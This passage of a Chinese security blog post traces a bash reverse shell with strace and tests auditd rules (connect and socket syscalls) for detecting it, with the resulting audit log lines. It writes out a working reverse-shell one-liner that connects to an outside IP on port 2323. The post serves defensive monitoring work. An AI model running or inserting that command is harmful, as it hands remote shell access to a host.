...&#125;) = 0</span><br><span class="line">stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0</span><br><span class="line">geteuid()                               = 0</span><br><span class="line">getegid()                               = 0</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">access(&quot;/bin/bash&quot;, X_OK)               = 0</span><br><span class="line">stat(&quot;/bin/bash&quot;, &#123;st_mode=S_IFREG|0755, st_size=1099016, ...&#125;) = 0</span><br><span class="line">geteuid()                               = 0</span><br><span class="line">getegid()                               = 0</span><br><span class="line">getuid()                                = 0</span><br><span class="line">getgid()                                = 0</span><br><span class="line">access(&quot;/bin/bash&quot;, R_OK)               = 0</span><br><span class="line">getpid()                                = 4833</span><br><span class="line">brk(0x7ba000)                           = 0x7ba000</span><br><span class="line">brk(0x7bb000)                           = 0x7bb000</span><br><span class="line">getpgrp()                               = 4831</span><br><span class="line">ioctl(2, TIOCGPGRP, [4831])             = 0</span><br><span class="line">rt_sigaction(SIGCHLD, &#123;sa_handler=0x44cf90, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">getrlimit(RLIMIT_NPROC, &#123;rlim_cur=15710, rlim_max=15710&#125;) = 0</span><br><span class="line">brk(0x7bc000)                           = 0x7bc000</span><br><span class="line">brk(0x7bd000)                           = 0x7bd000</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, NULL, [], 8)  = 0</span><br><span class="line">brk(0x7be000)                           = 0x7be000</span><br><span class="line">open(&quot;test.sh&quot;, O_RDONLY)               = 3</span><br><span class="line">stat(&quot;test.sh&quot;, &#123;st_mode=S_IFREG|0644, st_size=73, ...&#125;) = 0</span><br><span class="line">ioctl(3, TCGETS, 0x7ffeed722940)        = -1 ENOTTY (Inappropriate ioctl for device)</span><br><span class="line">lseek(3, 0, SEEK_CUR)                   = 0</span><br><span class="line">read(3, &quot;exec 9&lt;&gt; /dev/tcp/130.182.116.111&quot;..., 80) = 73</span><br><span class="line">lseek(3, 0, SEEK_SET)                   = 0</span><br><span class="line">getrlimit(RLIMIT_NOFILE, &#123;rlim_cur=1024, rlim_max=4*1024&#125;) = 0</span><br><span class="line">fcntl(255, F_GETFD)                     = -1 EBADF (Bad file descriptor)</span><br><span class="line">dup2(3, 255)                            = 255</span><br><span class="line">close(3)                                = 0</span><br><span class="line">fcntl(255, F_SETFD, FD_CLOEXEC)         = 0</span><br><span class="line">fcntl(255, F_GETFL)                     = 0x8000 (flags O_RDONLY|O_LARGEFILE)</span><br><span class="line">fstat(255, &#123;st_mode=S_IFREG|0644, st_size=73, ...&#125;) = 0</span><br><span class="line">lseek(255, 0, SEEK_CUR)                 = 0</span><br><span class="line">brk(0x7bf000)                           = 0x7bf000</span><br><span class="line">read(255, &quot;exec 9&lt;&gt; /dev/tcp/130.182.116.111&quot;..., 73) = 73</span><br><span class="line">brk(0x7c0000)                           = 0x7c0000</span><br><span class="line">socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3</span><br><span class="line">connect(3, &#123;sa_family=AF_INET, sin_port=htons(2323), sin_addr=inet_addr(&quot;130.182.116.111&quot;)&#125;, 16) = 0</span><br><span class="line">fcntl(9, F_GETFD)                       = -1 EBADF (Bad file descriptor)</span><br><span class="line">dup2(3, 9)                              = 9</span><br><span class="line">close(3)                                = 0</span><br><span class="line">fcntl(0, F_GETFD)                       = 0</span><br><span class="line">fcntl(0, F_DUPFD, 10)                   = 10</span><br><span class="line">fcntl(0, F_GETFD)                       = 0</span><br><span class="line">fcntl(10, F_SETFD, FD_CLOEXEC)          = 0</span><br><span class="line">dup2(9, 0)                              = 0</span><br><span class="line">fcntl(9, F_GETFD)                       = 0</span><br><span class="line">close(10)                               = 0</span><br><span class="line">fcntl(1, F_GETFD)                       = 0</span><br><span class="line">fcntl(1, F_DUPFD, 10)                   = 10</span><br><span class="line">fcntl(1, F_GETFD)                       = 0</span><br><span class="line">fcntl(10, F_SETFD, FD_CLOEXEC)          = 0</span><br><span class="line">dup2(9, 1)                              = 1</span><br><span class="line">fcntl(9, F_GETFD)                       = 0</span><br><span class="line">fcntl(2, F_GETFD)                       = 0</span><br><span class="line">fcntl(2, F_DUPFD, 10)                   = 11</span><br><span class="line">fcntl(2, F_GETFD)                       = 0</span><br><span class="line">fcntl(11, F_SETFD, FD_CLOEXEC)          = 0</span><br><span class="line">dup2(1, 2)                              = 2</span><br><span class="line">fcntl(1, F_GETFD)                       = 0</span><br><span class="line">close(11)                               = 0</span><br><span class="line">close(10)                               = 0</span><br><span class="line">brk(0x7c1000)                           = 0x7c1000</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0</span><br><span class="line">clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fcafdb65e10) = 4834</span><br><span class="line">rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0</span><br><span class="line">rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0</span><br><span class="line">rt_sigaction(SIGINT, &#123;sa_handler=0x449930, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">wait4(-1, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 127&#125;], 0, NULL) = 4834</span><br><span class="line">rt_sigaction(SIGINT, &#123;sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, &#123;sa_handler=0x449930, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7fcafd1cd030&#125;, 8) = 0</span><br><span class="line">rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0</span><br><span class="line">--- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=4834, si_uid=0, si_status=127, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">wait4(-1, 0x7ffeed722010, WNOHANG, NULL) = -1 ECHILD (No child processes)</span><br><span class="line">rt_sigreturn(&#123;mask=[]&#125;)                 = 0</span><br><span class="line">read(255, &quot;&quot;, 73)                       = 0</span><br><span class="line">rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0</span><br><span class="line">rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0</span><br><span class="line">exit_group(127)                         = ?</span><br><span class="line">+++ exited with 127 +++</span><br></pre></td></tr></table></figure>
<h3 id="2-strace-c-bash-test-sh"><a href="#2-strace-c-bash-test-sh" class="headerlink" title="2. strace -c bash test.sh"></a>2. strace -c bash test.sh</h3><p><img src="/2017/07/25/reverse-shell/reverse-shell.png" alt="reverse-shell"></p>
<h2 id="二、audit监控分析"><a href="#二、audit监控分析" class="headerlink" title="二、audit监控分析"></a>二、audit监控分析</h2><h3 id="1-audit相关资料"><a href="#1-audit相关资料" class="headerlink" title="1. audit相关资料"></a>1. audit相关资料</h3><ul>
<li><p>A Brief Introduction to auditd</p>
<p>  <a href="http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/" target="_blank" rel="noopener">http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/</a></p>
</li>
<li><p>Finding short-lived TCP connections owner process</p>
<p>  <a href="https://serverfault.com/questions/352259/finding-short-lived-tcp-connections-owner-process" target="_blank" rel="noopener">https://serverfault.com/questions/352259/finding-short-lived-tcp-connections-owner-process</a></p>
</li>
<li><p>Linux auditd</p>
<p>  <a href="http://wiki.nokernel.net/linux-auditd" target="_blank" rel="noopener">http://wiki.nokernel.net/linux-auditd</a></p>
</li>
<li><p>⁠Understanding Audit Log Files</p>
<p>  <a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/sec-Understanding_Audit_Log_Files.html" target="_blank" rel="noopener">https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/sec-Understanding_Audit_Log_Files.html</a></p>
</li>
<li><p>ubuntu - auditctl - a utility to assist controlling the kernel’s audit system</p>
<p>  <a href="http://manpages.ubuntu.com/manpages/zesty/en/man8/auditctl.8.html" target="_blank" rel="noopener">http://manpages.ubuntu.com/manpages/zesty/en/man8/auditctl.8.html</a></p>
</li>
<li><p>finding-short-lived-tcp-connections-owner-process</p>
<p>  <a href="https://serverfault.com/questions/352259/finding-short-lived-tcp-connections-owner-process" target="_blank" rel="noopener">https://serverfault.com/questions/352259/finding-short-lived-tcp-connections-owner-process</a></p>
</li>
</ul>
<h3 id="2-测试audit监控规则"><a href="#2-测试audit监控规则" class="headerlink" title="2. 测试audit监控规则"></a>2. 测试audit监控规则</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auditctl -A exit,always -S connect</span><br><span class="line">auditctl -a exit,always -F arch=b64 -F a0=2 -F a1=1 -S socket -k CONNECTION</span><br><span class="line">auditctl -a exit,always -F arch=b64 -S connect</span><br></pre></td></tr></table></figure>
<h4 id="1-auditctl-a-exit-always-F-arch-b64-S-connect"><a href="#1-auditctl-a-exit-always-F-arch-b64-S-connect" class="headerlink" title="1) auditctl -a exit,always -F arch=b64 -S connect"></a>1) auditctl -a exit,always -F arch=b64 -S connect</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~/pirogue/reverse_shell# auditctl -l</span><br><span class="line">-a always,exit -F arch=b64 -S connect</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tailf /var/log/audit/audit.log</span><br><span class="line"></span><br><span class="line">type=CONFIG_CHANGE msg=audit(1500974819.373:24): auid=0 ses=3 op=&quot;add_rule&quot; key=(null) list=4 res=1</span><br></pre></td></tr></table></figure>
<ul>
<li>bash test.sh</li>
</ul>
<p>回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tailf /var/log/audit/audit.log</span><br><span class="line"></span><br><span class="line">type=SYSCALL msg=audit(1500975246.989:30): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=1c052b8 a2=10 a3=129 items=0 ppid=4722 pid=7736 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;bash&quot; exe=&quot;/bin/bash&quot; key=(null)</span><br><span class="line">type=SOCKADDR msg=audit(1500975246.989:30): saddr=0200091385827E520000000000000000</span><br><span class="line">type=PROCTITLE msg=audit(1500975246.989:30): proctitle=6261736800746573742E7368</span><br></pre></td></tr></table></figure>
<ul>
<li>exec 9&lt;&gt; /dev/tcp/130.182.116.111/2323;exec 0&lt;&9;exec 1&gt;&amp;9 2&gt;&1;/bin/bash</li>
</ul>
<p>直接执行反弹命令，并没有audit到网络连接行为。但反弹shell中执行：whoami，出现回显。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">type=SYSCALL msg=audit(1500975460.957:49): arch=c000003e syscall=42 success=no exit=-2 a0=3 a1=7ffe9c798490 a2=6e a3=6 items=1 ppid=7771 pid=7775 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)</span><br><span class="line">type=SOCKADDR msg=audit(1500975460.957:49): saddr=01002F7661722F72756E2F6E7363642F736F636B657400000000000000000000E029ECE3CD550000002CECE3CD55000000000000000000004B389E12077F00008028ECE3CD55000080988C12077F00001C000000000000004073C312077F0000F386799CFE7F0000100000000000</span><br><span class="line">type=CWD msg=audit(1500975460.957:49): cwd=&quot;/root&quot;</span><br><span class="line">type=PATH msg=audit(1500975460.957:49): item=0 name=&quot;/var/run/nscd/socket&quot; nametype=UNKNOWN</span><br><span class="line">type=PROCTITLE msg=audit(1500975460.957:49): proctitle=&quot;whoami&quot;</span><br><span class="line">type=SYSCALL msg=audit(1500975460.961:50): arch=c000003e syscall=42 success=no exit=-2 a0=3 a1=7ffe9c798640 a2=6e a3=6 items=1 ppid=7771 pid=7775 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)</span><br><span class="line">type=SOCKADDR msg=audit(1500975460.961:50): saddr=01002F7661722F72756E2F6E7363642F736F636B65740000109AE512077F000001000000000000000000000000000000C887799CFE7F0000D120C412077F00000100000000000000109AE512077F0000010000000000000000000000000000000100000000000000000000000000</span><br><span class="line">type=CWD msg=audit(1500975460.961:50): cwd=&quot;/root&quot;</span><br><span class="line">type=PATH msg=audit(1500975460.961:50): item=0 name=&quot;/var/run/nscd/socket&quot; nametype=UNKNOWN</span><br><span class="line">type=PROCTITLE msg=audit(1500975460.961:50): proctitle=&quot;whoami&quot;</span><br></pre></td></tr></table></figure>
<h4 id="2-auditctl-a-always-exit-F-arch-b64-S-socket"><a href="#2-auditctl-a-always-exit-F-arch-b64-S-socket" class="headerlink" title="2) auditctl -a always,exit -F arch=b64 -S socket"></a>2) auditctl -a always,exit -F arch=b64 -S socket</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type=SYSCALL msg=audit(1500976257.753:113): arch=c000003e syscall=41 success=yes exit=3 a0=2 a1=1 a2=6 a3=2b items=0 ppid=2409 pid=7894 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;bash&quot; exe=&quot;/bin/bash&quot; key=(null)</span><br><span class="line">type=PROCTITLE msg=audit(1500976257.753:113): proctitle=&quot;/usr/lib/gnome-terminal/gnome-terminal-server&quot;</span><br></pre></td></tr></table></figure>
<p>执行反弹命令直接监控到日志如上。输入whoami，也可监控到回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type=SYSCALL msg=audit(1500976407.153:125): arch=c000003e syscall=41 success=yes exit=3 a0=1 a1=80801 a2=0 a3=6 items=0 ppid=7923 pid=7956 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)</span><br><span class="line">type=PROCTITLE msg=audit(1500976407.153:125): proctitle=&quot;whoami&quot;</span><br><span class="line">type=SYSCALL msg=audit(1500976407.153:126): arch=c000003e syscall=41 success=yes exit=3 a0=1 a1=80801 a2=0 a3=6 items=0 ppid=7923 pid=7956 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=3 comm=&quot;whoami&quot; exe=&quot;/usr/bin/whoami&quot; key=(null)</span><br><span class="line">type=PROCTITLE msg=audit(1500976407.153:126): proctitle=&quot;whoami&quot;</span><br></pre></td></tr></table></figure>
<p>待续…</p>
</div><div class="post-copyright"><blockquote><p>原文作者: pirogue</p><p>原文链接: <a href="http://pirogue.org/2017/07/25/reverse-shell/">http://pirogue.org/2017/07/25/reverse-shell/</a></p><p>版权声明: 转载请注明出处(必须保留作者署名及链接)</p></blockquote></div><div class="tags"><a href="/tags/甲方安全/">甲方安全</a><a href="/tags/信息安全/">信息安全</a><a href="/tags/反弹shell/">反弹shell</a><a href="/tags/安全监控/">安全监控</a></div><div class="post-share"><div class="social-share"><span>分享到:</span></div></div><div class="post-nav"><a href="/2017/08/24/WAZUH/" class="pre">Wazuh搭建</a><a href="/2017/06/17/甲方安全建设步骤/" class="next">甲方安全建设步骤</a></div><div id="comments"><script src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><div id="comment"></div><script type="text/javascript">new Valine({
  el: '#comment',  
  notify: false, 
  verify: false, 
  app_id: 'LxlH8totxFLNwkT4nTy2ccay-gzGzoHsz',
  appKey: 'Pzf3CsqHnjhKJryLexrAy45U',
  // 评论框占位符
  placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',  
  // 当前文章页路径，用于区分不同的文章页，以保证正确读取该文章页下的评论列表
  path:window.location.pathname,  
  // 默认头像类型
  avatar: 'wavatar',
  // 每页展示评论条数
  pageSize: 15
});</script></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">文章目录</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、跟踪系统调用"><span class="toc-text">一、跟踪系统调用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-strace-bash-test-sh"><span class="toc-text">1. strace bash test.sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-strace-c-bash-test-sh"><span class="toc-text">2. strace -c bash test.sh</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、audit监控分析"><span class="toc-text">二、audit监控分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-audit相关资料"><span class="toc-text">1. audit相关资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-测试audit监控规则"><span class="toc-text">2. 测试audit监控规则</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-auditctl-a-exit-always-F-arch-b64-S-connect"><span class="toc-text">1) auditctl -a exit,always -F arch=b64 -S connect</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-auditctl-a-always-exit-F-arch-b64-S-socket"><span class="toc-text">2) auditctl -a always,exit -F arch=b64 -S socket</span></a></li></ol></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/14/bacscanner/">越权扫描器碎碎念</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/quant/">币圈量化交易试水</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/22/golangxml/">被动扫描器研发（1）：golang生成cdata xml格式数据</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/17/awvs/">awvs（12.0.190515149）linux 安装和破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/15/opencanary_2/">opencanary二次开发(1)-日志格式</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/09/opencanary_1/">蜜罐正式开源-简单易用-支持16种协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/17/SPA/">前后端分离开发风险浅析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/14/异地恋/">异地恋</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/26/phishing/">甲方企业安全建设之钓鱼实践的一种姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/yulong-hids/">驭龙hids入侵检测功能初探</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-gui"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/安全建设/">安全建设</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全开发/">安全开发</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全运维/">安全运维</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工作生活/">工作生活</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/诗和远方/">诗和远方</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/量化交易/">量化交易</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> 标签</i></div><div class="tagcloud"><a href="/tags/Phishing/" style="font-size: 15px;">Phishing</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/运维/" style="font-size: 15px;">运维</a> <a href="/tags/审计策略/" style="font-size: 15px;">审计策略</a> <a href="/tags/安全建设/" style="font-size: 15px;">安全建设</a> <a href="/tags/甲方安全/" style="font-size: 15px;">甲方安全</a> <a href="/tags/前后端分离/" style="font-size: 15px;">前后端分离</a> <a href="/tags/开发/" style="font-size: 15px;">开发</a> <a href="/tags/架构/" style="font-size: 15px;">架构</a> <a href="/tags/渗透测试/" style="font-size: 15px;">渗透测试</a> <a href="/tags/文件上传漏洞/" style="font-size: 15px;">文件上传漏洞</a> <a href="/tags/阿里云OSS/" style="font-size: 15px;">阿里云OSS</a> <a href="/tags/awvs/" style="font-size: 15px;">awvs</a> <a href="/tags/漏洞扫描器/" style="font-size: 15px;">漏洞扫描器</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/多线程/" style="font-size: 15px;">多线程</a> <a href="/tags/回调函数/" style="font-size: 15px;">回调函数</a> <a href="/tags/脏牛/" style="font-size: 15px;">脏牛</a> <a href="/tags/dirtycow/" style="font-size: 15px;">dirtycow</a> <a href="/tags/CVE-2016-5195/" style="font-size: 15px;">CVE-2016-5195</a> <a href="/tags/博客/" style="font-size: 15px;">博客</a> <a href="/tags/hexo/" style="font-size: 15px;">hexo</a> <a href="/tags/留言板/" style="font-size: 15px;">留言板</a> <a href="/tags/CVE-2017-7525/" style="font-size: 15px;">CVE-2017-7525</a> <a href="/tags/CVE-2017-17485/" style="font-size: 15px;">CVE-2017-17485</a> <a href="/tags/Jackson-databind反序列化漏洞/" style="font-size: 15px;">Jackson-databind反序列化漏洞</a> <a href="/tags/安全分析/" style="font-size: 15px;">安全分析</a> <a href="/tags/蜜罐/" style="font-size: 15px;">蜜罐</a> <a href="/tags/开源/" style="font-size: 15px;">开源</a> <a href="/tags/opencanary/" style="font-size: 15px;">opencanary</a> <a href="/tags/OSS对象存储/" style="font-size: 15px;">OSS对象存储</a> <a href="/tags/上传漏洞/" style="font-size: 15px;">上传漏洞</a> <a href="/tags/解析漏洞/" style="font-size: 15px;">解析漏洞</a> <a href="/tags/漏洞预警/" style="font-size: 15px;">漏洞预警</a> <a href="/tags/截屏/" style="font-size: 15px;">截屏</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/信息安全/" style="font-size: 15px;">信息安全</a> <a href="/tags/黑客/" style="font-size: 15px;">黑客</a> <a href="/tags/信息收集/" style="font-size: 15px;">信息收集</a> <a href="/tags/系统/" style="font-size: 15px;">系统</a> <a href="/tags/钓鱼/" style="font-size: 15px;">钓鱼</a> <a href="/tags/poster模块/" style="font-size: 15px;">poster模块</a> <a href="/tags/上传/" style="font-size: 15px;">上传</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/QQ邮箱/" style="font-size: 15px;">QQ邮箱</a> <a href="/tags/ssrf/" style="font-size: 15px;">ssrf</a> <a href="/tags/w3af/" style="font-size: 15px;">w3af</a> <a href="/tags/诗歌/" style="font-size: 15px;">诗歌</a> <a href="/tags/配置文件/" style="font-size: 15px;">配置文件</a> <a href="/tags/xml/" style="font-size: 15px;">xml</a> <a href="/tags/cdata/" style="font-size: 15px;">cdata</a> <a href="/tags/burpsuite/" style="font-size: 15px;">burpsuite</a> <a href="/tags/golang/" style="font-size: 15px;">golang</a> <a href="/tags/二次开发/" style="font-size: 15px;">二次开发</a> <a href="/tags/btc/" style="font-size: 15px;">btc</a> <a href="/tags/量化交易/" style="font-size: 15px;">量化交易</a> <a href="/tags/CVE-2017-10271/" style="font-size: 15px;">CVE-2017-10271</a> <a href="/tags/java反序列化/" style="font-size: 15px;">java反序列化</a> <a href="/tags/weblogic反序列化漏洞/" style="font-size: 15px;">weblogic反序列化漏洞</a> <a href="/tags/XMLDecoder反序列化漏洞/" style="font-size: 15px;">XMLDecoder反序列化漏洞</a> <a href="/tags/工作生活/" style="font-size: 15px;">工作生活</a> <a href="/tags/乙方安全/" style="font-size: 15px;">乙方安全</a> <a href="/tags/启动流程/" style="font-size: 15px;">启动流程</a> <a href="/tags/账户管理/" style="font-size: 15px;">账户管理</a> <a href="/tags/tornado/" style="font-size: 15px;">tornado</a> <a href="/tags/Web自动化攻击平台/" style="font-size: 15px;">Web自动化攻击平台</a> <a href="/tags/Apache-Commons-Collections/" style="font-size: 15px;">Apache Commons Collections</a> <a href="/tags/反弹shell/" style="font-size: 15px;">反弹shell</a> <a href="/tags/安全监控/" style="font-size: 15px;">安全监控</a> <a href="/tags/exp/" style="font-size: 15px;">exp</a> <a href="/tags/Struts2/" style="font-size: 15px;">Struts2</a> <a href="/tags/网络安全/" style="font-size: 15px;">网络安全</a> <a href="/tags/hids/" style="font-size: 15px;">hids</a> <a href="/tags/驭龙hids/" style="font-size: 15px;">驭龙hids</a> <a href="/tags/安全开发/" style="font-size: 15px;">安全开发</a> <a href="/tags/越权/" style="font-size: 15px;">越权</a> <a href="/tags/扫描器/" style="font-size: 15px;">扫描器</a> <a href="/tags/Wazuh/" style="font-size: 15px;">Wazuh</a> <a href="/tags/ELK/" style="font-size: 15px;">ELK</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> 归档</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">20</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> 友情链接</i></div><ul></ul><a href="http://www.0x001.com/" title="0x001" target="_blank">0x001</a><ul></ul><a href="http://ksowo.com/" title="lyy" target="_blank">lyy</a><ul></ul><a href="http://xxlegend.com/" title="xxlegend" target="_blank">xxlegend</a><ul></ul><a href="https://bl4ck.in/" title="Tomato" target="_blank">Tomato</a><ul></ul><a href="https://my.oschina.net/9199771" title="超级大黑猫" target="_blank">超级大黑猫</a><ul></ul><a href="https://www.weiho.xyz/" title="Weiho" target="_blank">Weiho</a><ul></ul><a href="https://www.maliciouskr.cc/" title="MaliciousKr" target="_blank">MaliciousKr</a><ul></ul><a href="http://www.lshack.cn/" title="lsh4ck's blog" target="_blank">lsh4ck's blog</a><ul></ul><a href="https://www.0x002.com" title="Yunen's blog" target="_blank">Yunen's blog</a><ul></ul><a href="https://www.dp2px.com/" title="水寒的博客" target="_blank">水寒的博客</a><ul></ul><a href="https://www.pa55w0rd.online/" title="Pa55w0rd's blog" target="_blank">Pa55w0rd's blog</a><ul></ul><a href="http://www.mianhuage.com/" title="Cotton's Blog" target="_blank">Cotton's Blog</a><ul></ul><a href="https://zgao.top/" title="zgao" target="_blank">zgao</a><ul></ul><a href="http://lab.orchina.org/" title="糖果的实验室" target="_blank">糖果的实验室</a><ul></ul><a href="https://www.ms17010.net/" title="yd" target="_blank">yd</a><ul></ul><a href="http://blog.leanote.com/snowming" title="snowming" target="_blank">snowming</a><ul></ul><a href="https://www.cnblogs.com/ssooking" title="ssooking" target="_blank">ssooking</a><br>
<br>
『将定期清理无法访问的友情链接』</div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">网站地图</a> |  <a href="/atom.xml">订阅本站</a> |  <a href="/about/">联系博主</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">pirogue.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create','UA-92976027-1','auto');ga('send','pageview');
